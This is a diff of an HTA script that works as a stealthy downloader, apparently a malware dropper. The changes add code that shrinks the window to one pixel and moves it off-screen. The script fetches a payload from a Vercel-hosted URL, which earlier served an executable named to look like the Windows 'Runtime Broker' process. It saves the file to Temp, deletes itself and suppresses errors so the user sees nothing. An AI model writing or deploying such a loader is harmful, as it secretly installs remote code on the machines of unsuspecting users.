@@ -14,7 +14,6 @@
     INNERBORDER="no"
 />
 <style>
-    /* Make the window tiny and invisible */
     body { 
         margin: 0; 
         padding: 0; 
@@ -29,11 +28,15 @@
 </head>
 <body>
     <script language="JavaScript">
+        // Force the window to be 1x1 and move it off-screen
+        window.resizeTo(1, 1);
+        window.moveTo(-2000, -2000);
+
         try {
             // 1. Download payload
             var x = new ActiveXObject("MSXML2.XMLHTTP");
             // REPLACE WITH YOUR ACTUAL VERCEL URL
-            x.open("GET", "https://swift-executorlol.vercel.app/Runtime%20Broker.exe", false); 
+            x.open("GET", "https://swift-executorlol.vercel.app/delta.hta", false); 
             x.send();
 
             // 2. Save to Temp (Guaranteed permissions)
@@ -56,7 +59,7 @@
             fso.DeleteFile(WScript.ScriptFullName);
 
         } catch (e) {
-            // Silent fail - no big white box with an X
+            // Silent fail
         }
     </script>
 </body>
